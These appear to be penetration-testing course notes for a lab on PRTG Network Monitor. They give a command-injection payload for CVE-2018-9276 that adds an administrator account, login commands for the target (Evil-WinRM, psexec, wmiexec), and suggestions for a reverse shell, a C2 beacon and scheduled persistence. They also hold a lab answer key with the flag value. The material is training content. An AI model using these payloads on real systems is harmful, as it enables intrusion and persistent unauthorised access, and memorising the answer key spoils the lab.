# Section 15 — PRTG Network Monitor

## ID
906

## Module
Attacking Common Applications

## Kind
notes

## Title
Section 15 — PRTG Network Monitor

## Description
Covers discovering and fingerprinting PRTG Network Monitor, logging in with default/weak credentials, and exploiting CVE-2018-9276 (authenticated command injection via notification parameters) to gain RCE and local admin access on the target.

## Tags
prtg, command-injection, cve-2018-9276, monitoring, powershell, rce

## Commands
- `sudo nmap -sV -p- --open -T4 <TARGET_IP>`
- `curl -s http://<TARGET_IP>:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version`
- `sudo crackmapexec smb <TARGET_IP> -u prtgadm1 -p 'Pwn3d_by_PRTG!'`
- `evil-winrm -i <TARGET_IP> -u prtgadm1 -p 'Pwn3d_by_PRTG!'`
- `type C:\Users\Administrator\Desktop\flag.txt`

## What This Section Covers
PRTG Network Monitor is an agentless network monitoring tool (used by ~300,000 users worldwide) that runs an AJAX-based web interface typically on ports 80, 443, or 8080. It is rarely exposed externally but commonly found during internal pentests. Versions before 18.2.39 are vulnerable to CVE-2018-9276 — an authenticated command injection flaw where the Parameter field in notification settings is passed directly into a PowerShell script without sanitization, allowing arbitrary OS command execution.

## Background — PRTG at a Glance

- Made by Paessler (monitoring solutions since 1997), first released 2003
- Free version limited to 100 sensors / 20 hosts
- Uses autodiscovery + ICMP, SNMP, WMI, NetFlow, REST API for device communication
- Desktop apps available for Windows, Linux, macOS
- Used by Naples International Airport, Virginia Tech, 7-Eleven, and others
- Only 26 CVEs total; only 4 have public exploit PoCs (2 XSS, 1 DoS, 1 command injection)
- HTB box **Netmon** showcases PRTG

## Methodology

### Phase 1 — Discovery & Fingerprinting

1. **Nmap service scan** — PRTG shows up as `Indy httpd` with `Paessler PRTG bandwidth monitor` in the version string:
   ```
   sudo nmap -sV -p- --open -T4 <TARGET_IP>
   ```
   Look for output like: `Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)` on port 8080 (or 80/443).

2. **EyeWitness** also identifies PRTG and lists the default credentials `prtgadmin:prtgadmin`. Nessus has detection plugins too.

3. **Confirm version with cURL** — extract the exact version from the login page source:
   ```
   curl -s http://<TARGET_IP>:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version
   ```
   The version appears in the CSS link (`prtgversion=17.3.33.2830`) and in a `<span class="prtgversion">` tag.

4. **Check if vulnerable** — CVE-2018-9276 affects versions **before 18.2.39**. If the version is older, it's likely exploitable.

### Phase 2 — Authentication

5. **Try default credentials** — `prtgadmin:prtgadmin` are the defaults and are typically pre-filled on the login page. Often left unchanged.

6. **Try common variations** — in this lab, default creds fail but `prtgadmin:Password123` works after a few attempts.

### Phase 3 — Exploit CVE-2018-9276 (Authenticated Command Injection)

The vulnerability is in the notification system: when creating a notification that executes a program, the **Parameter** field is passed directly into a PowerShell script with no input sanitization.

7. **Navigate to notifications** — hover over **Setup** (top right) → **Account Settings** → **Notifications**.

8. **Create a new notification** — click **Add new notification**, give it a name (e.g. `pwn`).

9. **Configure the payload** — scroll down and check **EXECUTE PROGRAM**:
   - **Program File:** select `Demo exe notification - outfile.ps1`
   - **Parameter:** inject your command after `test.txt;`:
     ```
     test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
     ```
   This creates a local user `prtgadm1` with password `Pwn3d_by_PRTG!` and adds it to the local Administrators group.

10. **Save** the notification. You'll be redirected back to the Notifications list.

11. **Execute the payload** — select the notification in the list, then click the **bell icon** (test button) on the right side. A popup confirms: "EXE notification is queued up."

12. **This is blind command execution** — no output is returned. You must verify success externally.

### Phase 4 — Verify Access & Post-Exploitation

13. **Confirm local admin with CrackMapExec:**
    ```
    sudo crackmapexec smb <TARGET_IP> -u prtgadm1 -p 'Pwn3d_by_PRTG!'
    ```
    Look for `(Pwn3d!)` in the output confirming local admin.

14. **Connect via Evil-WinRM:**
    ```
    evil-winrm -i <TARGET_IP> -u prtgadm1 -p 'Pwn3d_by_PRTG!'
    ```

15. **Grab the flag:**
    ```
    type C:\Users\Administrator\Desktop\flag.txt
    ```

## Alternative Post-Exploitation Access Methods

Instead of Evil-WinRM, you could also use:
- **RDP:** `xfreerdp /v:<TARGET_IP> /u:prtgadm1 /p:'Pwn3d_by_PRTG!'`
- **Impacket psexec:** `impacket-psexec prtgadm1:'Pwn3d_by_PRTG!'@<TARGET_IP>`
- **Impacket wmiexec:** `impacket-wmiexec prtgadm1:'Pwn3d_by_PRTG!'@<TARGET_IP>`

## Alternative Payloads (Instead of Adding a User)

During a real engagement, adding users changes the system. Consider stealthier options:
- **Reverse shell:** `test.txt;powershell -e <BASE64_ENCODED_REVSHELL>` with a listener on your attack box
- **C2 callback:** download and execute a beacon/agent
- **Scheduled notification:** set the notification to run on a schedule for persistence (e.g. daily callback to C2)

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: PRTG version on target | 18.1.37.13946 | Nmap `-sV` scan on port 8080 or bottom-left of PRTG web UI login page |
| Q2: Flag on Administrator Desktop | WhOs3_m0nit0ring_wH0? | CVE-2018-9276 command injection → add local admin → Evil-WinRM → `type C:\Users\Administrator\Desktop\flag.txt` |

## Key Takeaways

- **PRTG is an internal pentest finding** — rarely exposed externally, but very common on internal networks
- **Default creds `prtgadmin:prtgadmin` are pre-filled on the login page** and frequently left unchanged — always try them first, then common variations
- **CVE-2018-9276 is authenticated-only** — you need valid creds before exploiting; the command injection is in the notification Parameter field
- **The injection is blind** — no output comes back; you must verify via SMB auth check, reverse shell callback, or another side channel
- **Notification scheduling = persistence** — you can set notifications to fire on a schedule, giving you a recurring command execution mechanism during long engagements
- **Version < 18.2.39 is vulnerable** — always check the version string via Nmap or cURL before attempting the exploit

## Gotchas

- The Parameter field payload starts with `test.txt;` — the semicolon breaks out of the intended parameter and chains your commands
- If you get an error when testing the notification, double-check that you selected `Demo exe notification - outfile.ps1` as the Program File
- CrackMapExec may need `sudo` depending on your Pwnbox setup
- The walkthrough version (18.1.37.13946) differs from the reading example (17.3.33.2830) — both are vulnerable since they're below 18.2.39
- Evil-WinRM requires port 5985 (WinRM) to be open — verify with Nmap if connection fails
